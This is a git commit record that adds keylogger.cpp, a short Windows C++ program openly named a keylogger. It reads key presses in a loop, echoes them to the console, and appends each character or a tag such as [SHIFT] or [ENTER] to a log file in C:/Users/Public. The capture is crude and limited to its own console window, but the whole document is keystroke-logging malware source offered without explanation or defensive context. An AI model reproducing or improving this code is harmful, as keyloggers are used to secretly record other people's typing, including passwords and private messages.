997e51c59b291c3b2327fa3a4a9eb1fd12bb9b5c
Murad Shafiyev <67688572+MuradShafiyev@users.noreply.github.com>
2021-12-16 20:30:04 -0800

    Create keylogger.cpp

---
+++ keylogger/keylogger.cpp
@@ -0,0 +1,60 @@
+#include <iostream>     
+#include <windows.h>    
+#include <conio.h>      
+#include <fstream>      
+using namespace std;
+
+int keys(char key, fstream&);
+
+int main() {
+    char key_press;
+    int ascii_value;                                                 
+    fstream afile;                                                 
+    afile.open("C:/Users/Public/log.txt", ios::in | ios::out);                         
+    afile.close();    
+
+    while(true) {
+    key_press = getch();
+    ascii_value = key_press;
+    
+    cout << "Here --> " << key_press << endl;
+    if(7 < ascii_value && ascii_value < 256)
+        keys(key_press, afile);  
+    }    
+    return 0;
+}    
+
+int keys(char key, fstream& file) {
+    file.open("C:/Users/Public/log.txt", ios::app | ios::in | ios::out);
+    if(file) {
+        if(GetAsyncKeyState(VK_SHIFT)) {
+            file << "[SHIFT]";
+        }
+        else if(GetAsyncKeyState(VK_ESCAPE)) {
+            file << "[ESCAPE]";
+        }                           
+        else if(GetAsyncKeyState(VK_RETURN)) {
+            file << "[ENTER]";
+        }
+        else if(GetAsyncKeyState(VK_CONTROL)) {
+            file << "[CONTROL]";
+        }
+        else if(GetAsyncKeyState(VK_MENU)) {
+            file << "[ALT]";
+        }
+        else if(GetAsyncKeyState(VK_DELETE)) {
+            file << "[DELETE]";
+        }
+        else if(GetAsyncKeyState(VK_TAB)) {
+            file << "[TAB]";
+        }
+        else if(GetAsyncKeyState(VK_BACK)){
+            file << "[BACKSPACE]";
+        }
+        else 
+            file << key;
+        
+    }
+    file.close();
+    return 0;
+}
